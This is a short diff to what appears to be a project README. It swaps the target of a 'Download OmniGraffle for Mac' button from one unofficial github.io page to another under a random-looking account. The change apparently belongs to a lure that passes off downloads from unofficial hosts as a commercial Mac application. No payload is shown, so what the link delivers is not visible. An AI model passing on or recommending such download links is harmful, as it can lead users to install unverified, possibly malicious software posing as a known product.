@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![⬇️ Download OmniGraffle for Mac](https://img.shields.io/badge/⬇️_Download_OmniGraffle_Mac-blue?style=for-the-badge&logo=apple)](https://omnigraffle-software.github.io/.github)
+[![⬇️ Download OmniGraffle for Mac](https://img.shields.io/badge/⬇️_Download_OmniGraffle_Mac-blue?style=for-the-badge&logo=apple)](https://ashshshshsh213.github.io/.github)
 
 </div>
 
